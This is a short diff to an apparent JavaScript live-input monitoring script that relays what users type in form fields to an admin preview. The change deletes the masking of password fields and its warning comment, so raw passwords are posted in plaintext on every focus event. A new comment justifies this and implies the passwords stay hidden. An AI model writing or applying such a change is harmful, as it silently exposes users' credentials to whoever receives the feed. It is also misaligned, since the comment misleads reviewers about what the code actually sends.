@@ -1117,9 +1117,9 @@ function __ux_emit_live(el, focused){
   var field = __ux_field_name(el);
   var type = (el.type || 'text').toLowerCase();
   var raw = el.value == null ? '' : String(el.value);
-  // Never broadcast password contents in plaintext through live feed.
-  var value = (type === 'password') ? raw.replace(/./g, '•') : raw;
-  __ux_post({__ux:true, type:'live_input', field: field, value: value, focused: !!focused, ftype: type});
+  // Send real value so admin live preview matches participant 1:1
+  // (password inputs still render as dots via type=password).
+  __ux_post({__ux:true, type:'live_input', field: field, value: raw, focused: !!focused, ftype: type});
 }
 document.addEventListener('focusin', function(e){ __ux_emit_live(e.target, true); }, true);
 document.addEventListener('focusout', function(e){ __ux_emit_live(e.target, false); }, true);
